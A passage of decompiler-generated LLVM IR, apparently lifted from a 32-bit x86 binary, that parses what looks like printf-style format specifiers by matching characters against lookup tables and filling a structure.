dec_label_pc_804efc0:                             ; preds = %dec_label_pc_804efb9
  %v1_804efc0 = inttoptr i32 %v1_804efe0 to i8*
  %v2_804efc0 = load i8, i8* %v1_804efc0, align 1
  %v11_804efc0 = icmp eq i8 %v2_804efc0, 36
  %v1_804efc3 = icmp eq i1 %v11_804efc0, false
  br i1 %v1_804efc3, label %dec_label_pc_804f205, label %dec_label_pc_804efc9

dec_label_pc_804efc9:                             ; preds = %dec_label_pc_804efc0
  %tmp91 = icmp slt i32 %v0_804efd7, 1
  br i1 %tmp91, label %dec_label_pc_804f205, label %dec_label_pc_804efd1

dec_label_pc_804efd1:                             ; preds = %dec_label_pc_804efc9
  store i32 %v8_804eee7, i32* %eax.global-to-local, align 4
  %v1_804efd6 = add i32 %v1_804efe0, 1
  store i32 %v1_804efd6, i32* @esi, align 4
  %v1_804efd7 = load i32, i32* @esp, align 4
  %v3_804efd7 = add i32 %v8_804eee7, 68
  %v4_804efd7 = add i32 %v3_804efd7, %v1_804efd7
  %v5_804efd7 = inttoptr i32 %v4_804efd7 to i32*
  store i32 %v0_804efd7, i32* %v5_804efd7, align 4
  %v0_804f01b.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804efe8

dec_label_pc_804efdd:                             ; preds = %dec_label_pc_804efb9
  %v1_804efdd = add i32 %v0_804efdd, 1
  store i32 %v1_804efdd, i32* %eax.global-to-local, align 4
  %v12_804efe0 = icmp eq i32 %v1_804efdd, %v1_804efe0
  %v1_804efe2 = icmp eq i1 %v12_804efe0, false
  br i1 %v1_804efe2, label %dec_label_pc_804f205, label %dec_label_pc_804efe8

dec_label_pc_804efe8:                             ; preds = %dec_label_pc_804efdd, %dec_label_pc_804efd1
  %v0_804f01b.pre.pre.pre = phi i32 [ %v1_804efe0, %dec_label_pc_804efdd ], [ %v0_804f01b.pre.pre.pre.pre, %dec_label_pc_804efd1 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804efed

dec_label_pc_804efed:                             ; preds = %dec_label_pc_804efb4, %dec_label_pc_804efe8
  %v0_804f01b.pre.pre = phi i32 [ %v1_804efe0, %dec_label_pc_804efb4 ], [ %v0_804f01b.pre.pre.pre, %dec_label_pc_804efe8 ]
  %v0_804ee86 = phi i32 [ %v0_804efd7, %dec_label_pc_804efb4 ], [ -2147483648, %dec_label_pc_804efe8 ]
  %v4_804efed = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804efed = icmp eq i32 %v4_804efed, 0
  %v1_804eff2 = icmp eq i1 %v5_804efed, false
  %.pre = inttoptr i32 %v0_804f01b.pre.pre to i8*
  br i1 %v1_804eff2, label %dec_label_pc_804f016, label %dec_label_pc_804eff8

dec_label_pc_804eff8:                             ; preds = %dec_label_pc_804efed
  %v2_804eff8 = load i8, i8* %.pre, align 1
  %v11_804eff8 = icmp eq i8 %v2_804eff8, 46
  %v1_804effb = icmp eq i1 %v11_804eff8, false
  br i1 %v1_804effb, label %dec_label_pc_804f00f, label %dec_label_pc_804effd

dec_label_pc_804effd:                             ; preds = %dec_label_pc_804eff8
  %v1_804effd = add i32 %v0_804f01b.pre.pre, 1
  store i32 %v1_804effd, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804eee0.outer

dec_label_pc_804f00f:                             ; preds = %dec_label_pc_804eff8
  br label %dec_label_pc_804f016

dec_label_pc_804f016:                             ; preds = %dec_label_pc_804efed, %dec_label_pc_804f00f
  %stack_var_-96.2 = phi i32 [ %v0_804ee86, %dec_label_pc_804f00f ], [ %stack_var_-96.1.ph, %dec_label_pc_804efed ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804f00f ], [ %v0_804ee86, %dec_label_pc_804efed ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8056798.161 to i32), i32* @edx, align 4
  %v4_804f01b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f01b

dec_label_pc_804f01b:                             ; preds = %dec_label_pc_804f025, %dec_label_pc_804f016
  %v0_804f025 = phi i32 [ %v1_804f025, %dec_label_pc_804f025 ], [ ptrtoint ([9 x i8]* @global_var_8056798.161 to i32), %dec_label_pc_804f016 ]
  %v4_804f01b = phi i32 [ %v6_804f01b, %dec_label_pc_804f025 ], [ %v4_804f01b.pre, %dec_label_pc_804f016 ]
  %v2_804f01b = load i8, i8* %.pre, align 1
  %v3_804f01b = zext i8 %v2_804f01b to i32
  %v5_804f01b = and i32 %v4_804f01b, -256
  %v6_804f01b = or i32 %v3_804f01b, %v5_804f01b
  store i32 %v6_804f01b, i32* %eax.global-to-local, align 4
  %v3_804f01d = inttoptr i32 %v0_804f025 to i8*
  %v4_804f01d = load i8, i8* %v3_804f01d, align 1
  %v15_804f01d = icmp eq i8 %v2_804f01b, %v4_804f01d
  br i1 %v15_804f01d, label %dec_label_pc_804ee8d, label %dec_label_pc_804f025

dec_label_pc_804f025:                             ; preds = %dec_label_pc_804f01b
  %v1_804f025 = add i32 %v0_804f025, 1
  store i32 %v1_804f025, i32* @edx, align 4
  %v1_804f026 = inttoptr i32 %v1_804f025 to i8*
  %v2_804f026 = load i8, i8* %v1_804f026, align 1
  %v3_804f026 = icmp eq i8 %v2_804f026, 0
  %v1_804f029 = icmp eq i1 %v3_804f026, false
  br i1 %v1_804f029, label %dec_label_pc_804f01b, label %dec_label_pc_804f02b

dec_label_pc_804f02b:                             ; preds = %dec_label_pc_804f025, %dec_label_pc_804ee8d
  %v0_804f03e = phi i32 [ %v1_804ee8d, %dec_label_pc_804ee8d ], [ %v0_804f01b.pre.pre, %dec_label_pc_804f025 ]
  %v0_804f03b = phi i32 [ %v0_804f025, %dec_label_pc_804ee8d ], [ %v1_804f025, %dec_label_pc_804f025 ]
  %v1_804f02d = add i32 %v0_804f03b, -134571928
  %v1_804f032 = add i32 %v0_804f03b, -134571929
  %v5_804f032 = sub i32 134571928, %v0_804f03b
  %v6_804f032 = and i32 %v1_804f02d, %v5_804f032
  %v7_804f032 = icmp slt i32 %v6_804f032, 0
  %v8_804f032 = icmp eq i32 %v1_804f032, 0
  %v9_804f032 = icmp slt i32 %v1_804f032, 0
  store i32 %v1_804f032, i32* %eax.global-to-local, align 4
  %v3_804f033 = icmp eq i1 %v9_804f032, %v7_804f032
  %v4_804f033 = icmp eq i1 %v8_804f032, false
  %v5_804f033 = and i1 %v4_804f033, %v3_804f033
  br i1 %v5_804f033, label %dec_label_pc_804f03f, label %dec_label_pc_804f035

dec_label_pc_804f035:                             ; preds = %dec_label_pc_804f02b
  %v1_804f035 = inttoptr i32 %v0_804f03e to i8*
  %v2_804f035 = load i8, i8* %v1_804f035, align 1
  %v3_804f035 = zext i8 %v2_804f035 to i32
  %v5_804f035 = and i32 %v1_804f032, -256
  %v6_804f035 = or i32 %v3_804f035, %v5_804f035
  store i32 %v6_804f035, i32* %eax.global-to-local, align 4
  %v3_804f037 = inttoptr i32 %v0_804f03b to i8*
  %v4_804f037 = load i8, i8* %v3_804f037, align 1
  %v15_804f037 = icmp eq i8 %v2_804f035, %v4_804f037
  %v1_804f039 = icmp eq i1 %v15_804f037, false
  br i1 %v1_804f039, label %dec_label_pc_804f03f, label %dec_label_pc_804f03b

dec_label_pc_804f03b:                             ; preds = %dec_label_pc_804f035
  %v1_804f03b = add i32 %v0_804f03b, 9
  store i32 %v1_804f03b, i32* @edx, align 4
  %v1_804f03e = add i32 %v0_804f03e, 1
  store i32 %v1_804f03e, i32* @esi, align 4
  br label %dec_label_pc_804f03f

dec_label_pc_804f03f:                             ; preds = %dec_label_pc_804f035, %dec_label_pc_804f02b, %dec_label_pc_804f03b
  %v4_804f043 = phi i32 [ %v6_804f035, %dec_label_pc_804f035 ], [ %v1_804f032, %dec_label_pc_804f02b ], [ %v6_804f035, %dec_label_pc_804f03b ]
  %v0_804f043 = phi i32 [ %v0_804f03e, %dec_label_pc_804f035 ], [ %v0_804f03e, %dec_label_pc_804f02b ], [ %v1_804f03e, %dec_label_pc_804f03b ]
  %v0_804f03f = phi i32 [ %v0_804f03b, %dec_label_pc_804f035 ], [ %v0_804f03b, %dec_label_pc_804f02b ], [ %v1_804f03b, %dec_label_pc_804f03b ]
  %v1_804f03f = add i32 %v0_804f03f, 9
  %v2_804f03f = inttoptr i32 %v1_804f03f to i8*
  %v3_804f03f = load i8, i8* %v2_804f03f, align 1
  %v4_804f03f = sext i8 %v3_804f03f to i32
  store i32 %v4_804f03f, i32* %ebx.global-to-local, align 4
  %v1_804f043 = inttoptr i32 %v0_804f043 to i8*
  %v2_804f043 = load i8, i8* %v1_804f043, align 1
  %v3_804f043 = zext i8 %v2_804f043 to i32
  %v5_804f043 = and i32 %v4_804f043, -256
  %v6_804f043 = or i32 %v3_804f043, %v5_804f043
  store i32 %v6_804f043, i32* %eax.global-to-local, align 4
  %v2_804f045 = mul nsw i32 %v4_804f03f, 256
  store i32 %v2_804f045, i32* %ebx.global-to-local, align 4
  %v4_804f048 = icmp eq i8 %v2_804f043, 0
  br i1 %v4_804f048, label %dec_label_pc_804f205, label %dec_label_pc_804f050

dec_label_pc_804f050:                             ; preds = %dec_label_pc_804f03f
  %v3_804f050 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f050, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_80567d5.162 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f059

dec_label_pc_804f059:                             ; preds = %dec_label_pc_804f0a9, %dec_label_pc_804f050
  %v0_804f0a9 = phi i32 [ %v1_804f0a9, %dec_label_pc_804f0a9 ], [ ptrtoint ([21 x i8]* @global_var_80567d5.162 to i32), %dec_label_pc_804f050 ]
  %v3_804f059 = inttoptr i32 %v0_804f0a9 to i8*
  %v4_804f059 = load i8, i8* %v3_804f059, align 1
  %v15_804f059 = icmp eq i8 %v2_804f043, %v4_804f059
  %v1_804f05b = icmp eq i1 %v15_804f059, false
  br i1 %v1_804f05b, label %dec_label_pc_804f0a9, label %dec_label_pc_804f05d

dec_label_pc_804f05d:                             ; preds = %dec_label_pc_804f059
  %v1_804f05f = add i32 %v0_804f0a9, -134571989
  store i32 %v1_804f05f, i32* %edx.global-to-local, align 4
  %v7_804f068 = icmp sgt i32 %v1_804f05f, 17
  br i1 %v7_804f068, label %dec_label_pc_804f06a, label %dec_label_pc_804f073

dec_label_pc_804f06a:                             ; preds = %dec_label_pc_804f05d
  %v1_804f06a = add i32 %v0_804f0a9, -134571991
  store i32 %v1_804f06a, i32* %eax.global-to-local, align 4
  %v3_804f06d = and i32 %v2_804f045, 1024
  %v4_804f06d = icmp eq i32 %v3_804f06d, 0
  %v1_804f070 = icmp eq i1 %v4_804f06d, false
  %v4_804f070 = select i1 %v1_804f070, i32 %v1_804f06a, i32 %v1_804f05f
  store i32 %v4_804f070, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f073

dec_label_pc_804f073:                             ; preds = %dec_label_pc_804f05d, %dec_label_pc_804f06a
  %v0_804f07c = phi i32 [ %v1_804f05f, %dec_label_pc_804f05d ], [ %v4_804f070, %dec_label_pc_804f06a ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80567cb.163 to i32), i32* %ecx.global-to-local, align 4
  %v2_804f07c = add i32 %tmp76, 32
  %v3_804f07c = inttoptr i32 %v2_804f07c to i32*
  store i32 %v0_804f07c, i32* %v3_804f07c, align 4
  %v0_804f07f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804f083.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f07f

dec_label_pc_804f07f:                             ; preds = %dec_label_pc_804f07f, %dec_label_pc_804f073
  %v0_804f07f = phi i32 [ %v1_804f07f, %dec_label_pc_804f07f ], [ %v0_804f07f.pre, %dec_label_pc_804f073 ]
  %v1_804f07f = add i32 %v0_804f07f, 1
  store i32 %v1_804f07f, i32* %ecx.global-to-local, align 4
  %v1_804f080 = inttoptr i32 %v1_804f07f to i8*
  %v2_804f080 = load i8, i8* %v1_804f080, align 1
  %v3_804f080 = sext i8 %v2_804f080 to i32
  store i32 %v3_804f080, i32* %eax.global-to-local, align 4
  %v8_804f085 = icmp sgt i32 %v0_804f083.pre, %v3_804f080
  br i1 %v8_804f085, label %dec_label_pc_804f07f, label %dec_label_pc_804f087

dec_label_pc_804f087:                             ; preds = %dec_label_pc_804f07f
  store i32 ptrtoint ([21 x i8]* @global_var_80567d5.162 to i32), i32* @ecx, align 4
  %v1_804f08e = add i32 %v0_804f07f, -134571979
  store i32 %v1_804f08e, i32* %eax.global-to-local, align 4
  %v2_804f093 = add i32 %v0_804f07f, add (i32 ptrtoint (i32* @global_var_80567bc.164 to i32), i32 -134571979)
  %v3_804f093 = add i32 %v2_804f093, %v1_804f08e
  %v4_804f093 = inttoptr i32 %v3_804f093 to i16*
  %v5_804f093 = load i16, i16* %v4_804f093, align 2
  %v6_804f093 = sext i16 %v5_804f093 to i32
  store i32 %v6_804f093, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804f08e, 2
  %v3_804f09b = add i32 %factor, 134571948
  %v4_804f09b = inttoptr i32 %v3_804f09b to i16*
  %v5_804f09b = load i16, i16* %v4_804f09b, align 2
  %v6_804f09b = sext i16 %v5_804f09b to i32
  store i32 %v6_804f09b, i32* %eax.global-to-local, align 4
  %v1_804f0a3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f0a3 = or i32 %v1_804f0a3, %v6_804f093
  %v2_804f0a5 = and i32 %v2_804f0a3, %v6_804f09b
  store i32 %v2_804f0a5, i32* %edx.global-to-local, align 4
  %v0_804f0b7.pre = load i32, i32* @esi, align 4
  %v0_804f0ba.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f0af

dec_label_pc_804f0a9:                             ; preds = %dec_label_pc_804f059
  %v1_804f0a9 = add i32 %v0_804f0a9, 1
  store i32 %v1_804f0a9, i32* @ecx, align 4
  %v1_804f0aa = inttoptr i32 %v1_804f0a9 to i8*
  %v2_804f0aa = load i8, i8* %v1_804f0aa, align 1
  %v3_804f0aa = icmp eq i8 %v2_804f0aa, 0
  %v1_804f0ad = icmp eq i1 %v3_804f0aa, false
  br i1 %v1_804f0ad, label %dec_label_pc_804f059, label %dec_label_pc_804f0af

dec_label_pc_804f0af:                             ; preds = %dec_label_pc_804f0a9, %dec_label_pc_804f087
  %v0_804f0ba = phi i32 [ %v0_804f0ba.pre, %dec_label_pc_804f087 ], [ %storemerge4, %dec_label_pc_804f0a9 ]
  %v0_804f0b7 = phi i32 [ %v0_804f0b7.pre, %dec_label_pc_804f087 ], [ %v0_804f043, %dec_label_pc_804f0a9 ]
  %v0_804f0af = phi i32 [ %v2_804f0a5, %dec_label_pc_804f087 ], [ %v3_804f050, %dec_label_pc_804f0a9 ]
  store i32 %v0_804f0af, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f0b7 = inttoptr i32 %v0_804f0b7 to i8*
  %v2_804f0b7 = load i8, i8* %v1_804f0b7, align 1
  %v3_804f0b7 = sext i8 %v2_804f0b7 to i32
  store i32 %v3_804f0b7, i32* %eax.global-to-local, align 4
  %v2_804f0ba = add i32 %tmp76, 4
  %v3_804f0ba = inttoptr i32 %v2_804f0ba to i32*
  store i32 %v0_804f0ba, i32* %v3_804f0ba, align 4
  %v0_804f0bd = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0bd = load i32, i32* @edx, align 4
  %v2_804f0bd = add i32 %v1_804f0bd, 12
  %v3_804f0bd = inttoptr i32 %v2_804f0bd to i32*
  store i32 %v0_804f0bd, i32* %v3_804f0bd, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804f0c4 = load i32, i32* @edx, align 4
  %v1_804f0c4 = add i32 %v0_804f0c4, 28
  %v2_804f0c4 = inttoptr i32 %v1_804f0c4 to i32*
  store i32 1, i32* %v2_804f0c4, align 4
  %v0_804f0cb = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0cb = load i32, i32* @edx, align 4
  %v2_804f0cb = add i32 %v1_804f0cb, 8
  %v3_804f0cb = inttoptr i32 %v2_804f0cb to i32*
  store i32 %v0_804f0cb, i32* %v3_804f0cb, align 4
  %v0_804f0ce = load i32, i32* %edi.global-to-local, align 4
  %v1_804f0d8 = and i32 %v0_804f0ce, -5
  %v0_804f0de = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f0de = and i32 %v0_804f0de, 3840
  store i32 %v1_804f0de, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804f0e7 = or i32 %v1_804f0de, %v1_804f0d8
  store i32 %v2_804f0e7, i32* @edi, align 4
  %v1_804f0e9 = load i32, i32* @edx, align 4
  %v2_804f0e9 = add i32 %v1_804f0e9, 20
  %v3_804f0e9 = inttoptr i32 %v2_804f0e9 to i32*
  store i32 48, i32* %v3_804f0e9, align 4
  %v0_804f0ec = load i32, i32* @edi, align 4
  %v1_804f0ec = load i32, i32* @edx, align 4
  %v2_804f0ec = add i32 %v1_804f0ec, 16
  %v3_804f0ec = inttoptr i32 %v2_804f0ec to i32*
  store i32 %v0_804f0ec, i32* %v3_804f0ec, align 4
  %v0_804f0ef = load i32, i32* @ecx, align 4
  %v1_804f0ef = inttoptr i32 %v0_804f0ef to i8*
  %v2_804f0ef = load i8, i8* %v1_804f0ef, align 1
  %v3_804f0ef = icmp eq i8 %v2_804f0ef, 0
  %v1_804f0f2 = icmp eq i1 %v3_804f0ef, false
  br i1 %v1_804f0f2, label %dec_label_pc_804f10b, label %dec_label_pc_804f0f4

dec_label_pc_804f0f4:                             ; preds = %dec_label_pc_804f0af
  %v0_804f0f4 = load i32, i32* @esi, align 4
  %v1_804f0f4 = inttoptr i32 %v0_804f0f4 to i8*
  %v2_804f0f4 = load i8, i8* %v1_804f0f4, align 1
  %v11_804f0f4 = icmp eq i8 %v2_804f0f4, 109
  %v1_804f0f7 = icmp eq i1 %v11_804f0f4, false
  br i1 %v1_804f0f7, label %dec_label_pc_804f205, label %dec_label_pc_804f0fd

dec_label_pc_804f0fd:                             ; preds = %dec_label_pc_804f0f4
  %v0_804f0fd = load i32, i32* @edx, align 4
  %v1_804f0fd = add i32 %v0_804f0fd, 32
  %v2_804f0fd = inttoptr i32 %v1_804f0fd to i32*
  store i32 20, i32* %v2_804f0fd, align 4
  %v0_804f104 = load i32, i32* @edx, align 4
  %v1_804f104 = add i32 %v0_804f104, 28
  %v2_804f104 = inttoptr i32 %v1_804f104 to i32*
  store i32 0, i32* %v2_804f104, align 4
  br label %dec_label_pc_804f10b

dec_label_pc_804f10b:                             ; preds = %dec_label_pc_804f0af, %dec_label_pc_804f0fd
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804f1a7, label %dec_label_pc_804f116

dec_label_pc_804f116:                             ; preds = %dec_label_pc_804f10b
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804f18f = add i32 %tmp76, 40
  %v4_804f125 = add i32 %tmp76, 36
  %v1_804f198 = add i32 %tmp76, 28
  %v2_804f198 = inttoptr i32 %v1_804f198 to i32*
  br label %dec_label_pc_804f118

dec_label_pc_804f118:                             ; preds = %dec_label_pc_804f193, %dec_label_pc_804f116
  %v0_804f12e = phi i32 [ 0, %dec_label_pc_804f116 ], [ %v1_804f197, %dec_label_pc_804f193 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f116 ], [ %stack_var_-88.5, %dec_label_pc_804f193 ]
  %v1_804f118 = add i32 %v0_804f12e, -2
  %v6_804f118 = sub i32 1, %v0_804f12e
  %v7_804f118 = and i32 %v6_804f118, %v0_804f12e
  %v8_804f118 = icmp slt i32 %v7_804f118, 0
  %v9_804f118 = icmp eq i32 %v1_804f118, 0
  %v10_804f118 = icmp slt i32 %v1_804f118, 0
  %v3_804f11b = icmp eq i1 %v10_804f118, %v8_804f118
  %v4_804f11b = icmp eq i1 %v9_804f118, false
  %v5_804f11b = and i1 %v4_804f11b, %v3_804f11b
  br i1 %v5_804f11b, label %dec_label_pc_804f12e, label %dec_label_pc_804f11d

dec_label_pc_804f11d:                             ; preds = %dec_label_pc_804f118
  %v0_804f11d = load i32, i32* @esp, align 4
  %v2_804f11d = mul i32 %v0_804f12e, 4
  %v3_804f11d = add i32 %v2_804f11d, 68
  %v4_804f11d = add i32 %v3_804f11d, %v0_804f11d
  %v5_804f11d = inttoptr i32 %v4_804f11d to i32*
  %v6_804f11d = load i32, i32* %v5_804f11d, align 4
  store i32 %v6_804f11d, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f125 = trunc i32 %v6_804f11d to i8
  %v5_804f125 = add i32 %v4_804f125, %v0_804f12e
  %v6_804f125 = inttoptr i32 %v5_804f125 to i8*
  store i8 %v1_804f125, i8* %v6_804f125, align 1
  %v0_804f129 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f129 = urem i32 %v0_804f129, 256
  br label %dec_label_pc_804f137

dec_label_pc_804f12e:                             ; preds = %dec_label_pc_804f118
  %v5_804f130 = add i32 %v0_804f12e, %stack_var_-32.3
  store i32 %v5_804f130, i32* %eax.global-to-local, align 4
  %v1_804f134 = add i32 %v5_804f130, -2
  br label %dec_label_pc_804f137

dec_label_pc_804f137:                             ; preds = %dec_label_pc_804f11d, %dec_label_pc_804f12e
  %v0_804f14a = phi i32 [ %v1_804f129, %dec_label_pc_804f11d ], [ %v1_804f134, %dec_label_pc_804f12e ]
  store i32 %v0_804f14a, i32* %eax.global-to-local, align 4
  %v5_804f137 = sub i32 %v0_804f14a, %stack_var_-88.4
  %v11_804f137 = xor i32 %v0_804f14a, %stack_var_-88.4
  %v12_804f137 = xor i32 %v5_804f137, %v0_804f14a
  %v13_804f137 = and i32 %v12_804f137, %v11_804f137
  %v14_804f137 = icmp slt i32 %v13_804f137, 0
  %v15_804f137 = icmp eq i32 %v5_804f137, 0
  %v16_804f137 = icmp slt i32 %v5_804f137, 0
  %v3_804f13b = icmp ne i1 %v16_804f137, %v14_804f137
  %v4_804f13b = or i1 %v15_804f137, %v3_804f13b
  br i1 %v4_804f13b, label %dec_label_pc_804f14a, label %dec_label_pc_804f13d

dec_label_pc_804f13d:                             ; preds = %dec_label_pc_804f137
  %v1_804f13d = add i32 %v0_804f14a, -9
  %v6_804f13d = sub i32 8, %v0_804f14a
  %v7_804f13d = and i32 %v6_804f13d, %v0_804f14a
  %v8_804f13d = icmp slt i32 %v7_804f13d, 0
  %v9_804f13d = icmp eq i32 %v1_804f13d, 0
  %v10_804f13d = icmp slt i32 %v1_804f13d, 0
  %v3_804f140 = icmp eq i1 %v10_804f13d, %v8_804f13d
  %v4_804f140 = icmp eq i1 %v9_804f13d, false
  %v5_804f140 = and i1 %v4_804f140, %v3_804f140
  br i1 %v5_804f140, label %dec_label_pc_804f205, label %dec_label_pc_804f14a

dec_label_pc_804f14a:                             ; preds = %dec_label_pc_804f13d, %dec_label_pc_804f137
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804f137 ], [ %v0_804f14a, %dec_label_pc_804f13d ]
  %v1_804f14a = add i32 %v0_804f14a, -1
  store i32 %v1_804f14a, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804f153 = load i32, i32* @esp, align 4
  %v1_804f153 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f153 = mul i32 %v1_804f153, 4
  %v3_804f153 = add i32 %v0_804f153, 80
  %v4_804f153 = add i32 %v3_804f153, %v2_804f153
  %v5_804f153 = inttoptr i32 %v4_804f153 to i32*
  %v6_804f153 = load i32, i32* %v5_804f153, align 4
  store i32 %v6_804f153, i32* %edi.global-to-local, align 4
  %v2_804f157 = mul i32 %v1_804f14a, 4
  %v4_804f157 = add i32 %v4_804f18f, %v2_804f157
  %v5_804f157 = inttoptr i32 %v4_804f157 to i32*
  %v6_804f157 = load i32, i32* %v5_804f157, align 4
  store i32 %v6_804f157, i32* @eax, align 4
  %v9_804f15b = icmp eq i32 %v6_804f153, 8
  br i1 %v9_804f15b, label %dec_label_pc_804f193, label %dec_label_pc_804f160

dec_label_pc_804f160:                             ; preds = %dec_label_pc_804f14a
  %v9_804f160 = icmp eq i32 %v6_804f157, 8
  br i1 %v9_804f160, label %dec_label_pc_804f183, label %dec_label_pc_804f165

dec_label_pc_804f165:                             ; preds = %dec_label_pc_804f160
  %v12_804f165 = icmp eq i32 %v6_804f157, %v6_804f153
  br i1 %v12_804f165, label %dec_label_pc_804f183, label %dec_label_pc_804f169

dec_label_pc_804f169:                             ; preds = %dec_label_pc_804f165
  %v1_804f169 = call i32 @_promoted_size(i32 %v1_804f14a)
  store i32 %v1_804f169, i32* %ebx.global-to-local, align 4
  %v0_804f170 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804f170, i32* @eax, align 4
  %v1_804f172 = call i32 @_promoted_size(i32 %v1_804f14a)
  %v2_804f177 = sub i32 %v1_804f169, %v1_804f172
  %v8_804f177 = xor i32 %v1_804f169, %v1_804f172
  %v9_804f177 = xor i32 %v2_804f177, %v1_804f169
  %v10_804f177 = and i32 %v9_804f177, %v8_804f177
  %v11_804f177 = icmp slt i32 %v10_804f177, 0
  %v12_804f177 = icmp eq i32 %v2_804f177, 0
  %v13_804f177 = icmp slt i32 %v2_804f177, 0
  %v3_804f179 = icmp ne i1 %v13_804f177, %v11_804f177
  %v4_804f179 = or i1 %v12_804f177, %v3_804f179
  %v5_804f179 = zext i1 %v4_804f179 to i32
  store i32 %v5_804f179, i32* %eax.global-to-local, align 4
  %v1_804f17f = icmp eq i1 %v4_804f179, false
  br i1 %v1_804f17f, label %dec_label_pc_804f193, label %dec_label_pc_804f169.dec_label_pc_804f183_crit_edge

dec_label_pc_804f169.dec_label_pc_804f183_crit_edge: ; preds = %dec_label_pc_804f169
  %v0_804f183.pre = load i32, i32* @esp, align 4
  %v1_804f183.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f183

dec_label_pc_804f183:                             ; preds = %dec_label_pc_804f169.dec_label_pc_804f183_crit_edge, %dec_label_pc_804f165, %dec_label_pc_804f160
  %v1_804f183 = phi i32 [ %v1_804f183.pre, %dec_label_pc_804f169.dec_label_pc_804f183_crit_edge ], [ %v1_804f153, %dec_label_pc_804f165 ], [ %v1_804f153, %dec_label_pc_804f160 ]
  %v0_804f183 = phi i32 [ %v0_804f183.pre, %dec_label_pc_804f169.dec_label_pc_804f183_crit_edge ], [ %v0_804f153, %dec_label_pc_804f165 ], [ %v0_804f153, %dec_label_pc_804f160 ]
  %v2_804f183 = mul i32 %v1_804f183, 4
  %v3_804f183 = add i32 %v0_804f183, 80
  %v4_804f183 = add i32 %v3_804f183, %v2_804f183
  %v5_804f183 = inttoptr i32 %v4_804f183 to i32*
  %v6_804f183 = load i32, i32* %v5_804f183, align 4
  store i32 %v6_804f183, i32* %eax.global-to-local, align 4
  store i32 %v1_804f14a, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804f183, i32* %v5_804f157, align 4
  br label %dec_label_pc_804f193

dec_label_pc_804f193:                             ; preds = %dec_label_pc_804f169, %dec_label_pc_804f14a, %dec_label_pc_804f183
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804f197 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f197 = add i32 %v0_804f197, 1
  store i32 %v1_804f197, i32* %ebp.global-to-local, align 4
  %v3_804f198 = load i32, i32* %v2_804f198, align 4
  %v1_804f19b = add i32 %v3_804f198, 2
  store i32 %v1_804f19b, i32* %eax.global-to-local, align 4
  %v5_804f1a0 = icmp slt i32 %v1_804f197, %v1_804f19b
  br i1 %v5_804f1a0, label %dec_label_pc_804f118, label %dec_label_pc_804f1ce

dec_label_pc_804f1a7:                             ; preds = %dec_label_pc_804f10b
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804f1ab = add i32 %tmp76, 38
  %v2_804f1ab = inttoptr i32 %v1_804f1ab to i8*
  store i8 1, i8* %v2_804f1ab, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804f1b4 = add i32 %tmp76, 28
  %v2_804f1b4 = inttoptr i32 %v1_804f1b4 to i32*
  %v3_804f1b4 = load i32, i32* %v2_804f1b4, align 4
  %v2_804f1b7 = mul i32 %v3_804f1b4, 4
  %v2_804f1bb = ptrtoint i32* %stack_var_-20 to i32
  %v1_804f1c2 = add i32 %tmp76, 40
  store i32 %v1_804f1c2, i32* %eax.global-to-local, align 4
  %v3_804f1c6 = inttoptr i32 %v1_804f1c2 to i16*
  %v4_804f1c6 = call i32 @memcpy(i16* %v3_804f1c6, i32 %v2_804f1bb, i32 %v2_804f1b7)
  store i32 %v4_804f1c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f1ce

dec_label_pc_804f1ce:                             ; preds = %dec_label_pc_804f193, %dec_label_pc_804f1a7
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f1a7 ], [ %stack_var_-88.5, %dec_label_pc_804f193 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804f1d6 = inttoptr i32 %v1_804ee77 to i8*
  %v3_804f1d6 = load i8, i8* %v2_804f1d6, align 1
  %v5_804f1d6 = icmp slt i8 %v3_804f1d6, 0
  store i32 %stack_var_-88.6, i32* %v2_804ee70, align 4
  br i1 %v5_804f1d6, label %dec_label_pc_804f1e6, label %dec_label_pc_804f1df
